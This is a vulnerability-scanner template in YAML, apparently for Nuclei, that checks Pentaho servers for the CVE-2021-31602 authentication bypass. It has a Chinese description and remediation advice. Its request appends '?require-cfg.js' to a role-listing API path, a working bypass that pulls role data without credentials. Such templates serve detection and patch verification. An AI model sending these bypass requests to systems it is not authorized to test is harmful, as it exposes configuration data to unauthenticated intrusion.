id: CVE-2021-31602
info:
  name: Pentaho <= 9.1 Authentication Bypass of Spring APIs
  author:
  - l0ne1y
  description: |-
    Pentaho Business Analytics 认证绕过漏洞
    Hitachi Vantara Pentaho是日本Hitachi公司的一款用于大数据环境中对数据进行存储和管理的服务。

    Hitachi Vantara Pentaho 存在访问控制错误漏洞，该漏洞源于在 Hitachi Vantara Pentaho 通过 9.1 和 Pentaho Business Intelligence Server 通过 7.x 中发现了一个问题。安全模型具有不同的访问控制层。其中一层是 applicationContext 安全性，它在 applicationContext-spring-security.xml 文件中定义。默认配置允许先前不了解平台设置的未经身份验证的用户在不拥有有效凭据的情况下提取信息片段。
  severity: high
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://support.pentaho.com/hc/en-us

    临时修复方案：
    1、前后端同时对用户输入信息进行校验，双重验证机制。
    2、调用功能前验证用户是否有权限调用相关功能。
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - <roleList>
    - <roles>Anonymous</roles>
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/pentaho/api/userrolelist/systemRoles?require-cfg.js'
  - '{{BaseURL}}/api/userrolelist/systemRoles?require-cfg.js'
  method: GET
  stop-at-first-match: true
